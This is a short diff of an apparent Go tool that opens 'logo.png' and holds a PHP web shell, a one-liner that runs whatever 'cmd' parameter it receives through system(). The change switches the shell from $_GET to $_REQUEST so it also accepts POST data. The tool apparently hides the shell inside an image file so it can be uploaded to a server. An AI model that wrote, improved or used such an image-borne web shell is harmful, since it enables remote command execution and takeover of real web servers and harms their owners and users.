@@ -5,7 +5,7 @@ import (
 )
 
 func main() {
-	const content = "<?php echo system($_GET['cmd']); ?>"
+	const content = "<?php echo system($_REQUEST['cmd']); ?>"
 
 	fimg, err := os.Open("logo.png")
 	check(err)
